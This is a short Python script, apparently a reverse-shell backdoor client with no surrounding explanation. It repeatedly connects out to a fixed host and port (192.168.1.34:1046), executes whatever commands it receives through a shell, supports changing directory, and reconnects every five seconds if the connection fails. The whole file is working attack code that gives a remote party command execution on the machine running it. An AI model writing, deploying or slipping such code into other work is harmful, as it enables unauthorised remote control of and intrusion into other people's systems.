import socket
import os
import subprocess
import time
import signal

target_host = "192.168.1.34"
target_port = 1046

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_host, target_port))
        print(f"[*] Connected to {target_host}:{target_port}")
        
        while True:
            data = client.recv(1024)
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))
            if len(data) > 0:
                cmd = subprocess.Popen(data[:], stdout=subprocess.PIPE, 
                       shell=True, preexec_fn=os.setsid) 
                time.sleep(20)
                os.killpg(os.getpgid(cmd.pid), signal.SIGTERM)
                break
        client.close()

    except Exception as e:
        print(f"[-] Connection error: {e}")
        print("[*] Retrying in 5 seconds...")
        time.sleep(5)  # Wait for 5 seconds before retrying
